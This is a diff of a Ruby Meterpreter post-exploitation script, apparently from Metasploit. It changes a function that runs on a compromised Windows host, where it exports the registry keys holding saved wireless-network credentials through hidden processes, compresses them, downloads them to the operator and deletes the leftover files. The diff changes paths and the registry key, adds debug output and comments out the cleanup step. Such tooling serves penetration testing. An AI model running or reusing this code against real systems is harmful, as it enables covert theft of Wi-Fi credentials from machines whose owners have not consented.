@@ -455,10 +455,10 @@ def dumpwlankeys(session,pathoflogs,filename)
 	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
 	garbage = ''
 	windrtmp = ''
-	windir = session.fs.file.expand_path("%WinDir%")
+	windir = session.fs.file.expand_path("%TEMP%")
 	print_status('Dumping and Downloading the Registry entries for Configured Wireless Networks')
 	xpwlan = "HKLM\\Software\\Microsoft\\WZCSVC\\Parameters\\Interfaces"
-	vswlan = "HKLM\\SOFTWARE\\Microsoft\\Wlansvc\\Interfaces"
+	vswlan = "HKLM\\Software\\Microsoft\\Wlansvc"
 	info = session.sys.config.sysinfo
 	trgtos = info['OS']
 	if trgtos =~ /(Windows XP)/
@@ -468,15 +468,17 @@ def dumpwlankeys(session,pathoflogs,filename)
 	end
   	begin
 		print_status("\tExporting #{key}")
-		r = session.sys.process.execute("cmd.exe /c reg.exe export #{key} #{windir}\\Temp\\wlan#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
+		r = session.sys.process.execute("reg export \"#{key}\" #{windir}\\wlan#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
 			garbage << d
 		end
+		sleep(2)
 		r.channel.close
 		r.close
 		print_status("\tCompressing key into cab file for faster download")
-		r = session.sys.process.execute("cmd.exe /c makecab #{windir}\\Temp\\wlan#{filename}.reg #{windir}\\Temp\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
+		r = session.sys.process.execute("cmd.exe /c makecab #{windir}\\wlan#{filename}.reg #{windir}\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
+			puts d
 			garbage << d
 		end
 		r.channel.close
@@ -489,14 +491,15 @@ def dumpwlankeys(session,pathoflogs,filename)
 	
 	begin	
 		print_status("\tDownloading wlan#{filename}.cab to -> #{pathoflogs}/wlan#{filename}.cab")
-		session.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\Temp\\wlan#{filename}.cab")
+		session.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\wlan#{filename}.cab")
 		sleep(5)
 	rescue ::Exception => e
     		print_status("Error Downloading Registry keys #{e.class} #{e}")
   	end
 	#Deleting left over files
 	print_status("\tDeleting left over files")
-	session.sys.process.execute("cmd.exe /c del #{windir}\\Temp\\wlan*", nil, {'Hidden' => 'true'})
+	puts "cmd.exe /c del #{windir}\\wlan*"
+	#session.sys.process.execute("cmd.exe /c del #{windir}\\wlan*", nil, {'Hidden' => 'true'})
 
 end
 # Functions Provided by natron (natron 0x40 invisibledenizen 0x2E com)
@@ -609,7 +612,7 @@ if helpopt != 1
 		filewrt(dest,wmicexec(session,wmic))
 		filewrt(dest,findprogs(session))
 		dumpwlankeys(session,logs,filenameinfo)
-	elsif trgtos =~ /(Windows 2003)/
+	elsif trgtos =~ /(Windows .NET)/
 		filewrt(dest,list_exec(session,commands))
 		filewrt(dest,wmicexec(session,wmic))
 		filewrt(dest,findprogs(session))
